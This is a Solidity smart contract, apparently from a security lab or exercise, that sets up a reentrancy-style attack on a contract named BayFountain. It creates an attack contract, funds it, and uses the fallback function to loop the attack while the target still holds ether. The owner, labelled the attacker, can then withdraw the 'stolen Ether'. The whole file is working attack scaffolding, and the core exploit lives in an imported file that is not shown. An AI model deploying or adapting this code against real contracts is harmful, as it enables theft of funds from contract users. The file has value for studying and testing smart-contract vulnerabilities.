
pragma solidity ^0.4.25;
import "./BayFountain.sol";
import "./BayFountainAttack.sol";

// Contract for setting up the Bay Fountain attack and withdrawing stolen Ether.
contract BayFountainAttackSetup{ 
    // Stores the target BayFountain contract.
    BayFountain private bayFountain;
    // Stores the attack contract.
    BayFountainAttack private bayAttack;
    // Stores the owner (attacker).
    address private owner;
    // Stores the balance of stolen ether.
    uint private balAmount;
    
    // Constructor creates a new BayFountainAttackSetup and initialises variables.
    constructor (address _bayAddress) public {
        // Initialises bayFountain with the target BayFountain address.
        bayFountain = BayFountain(_bayAddress);
        // Initialises bayAttack with the target BayFountain.
        bayAttack = new BayFountainAttack(bayFountain);
        // Sets the owner (attacker).
        owner = msg.sender;
    } 
    
    // Payable function takes some ether to set up and start the attack.
    function attackSetup () payable public{
        // Increments balance to track stolen ether.
        balAmount += msg.value;
        // Passes provided ether to the attackSetup function in BayFountainAttack contract. 
        bayAttack.attackSetup.value(msg.value)();
        // Executes the conductAttack function in BayFountainAttack contract. 
        bayAttack.conductAttack();
    }
    
    // Function returns the current balance of stolen ether (for testing).
    function checkBalance() external view returns (uint){
        return address(this).balance;
    }
    
    // Function transfers the ether to the owner's (attacker's) account.
    function withdraw() external {
        // Ensures only the owner can withdraw ether.
        require(msg.sender == owner,
            "Only the owner can withdraw Ether."
        );
        // Completes the transfer.
        msg.sender.transfer(address(this).balance);
    }
    
    // Fallback function to call conductAttack and create a loop.
    function () payable public{
        // Checks if the BayFountain still contains ether.
        if (address(bayFountain).balance >= balAmount){
            // Executes the conductAttack function in BayFountainAttack contract. 
            bayAttack.conductAttack();
        }
    }
    
}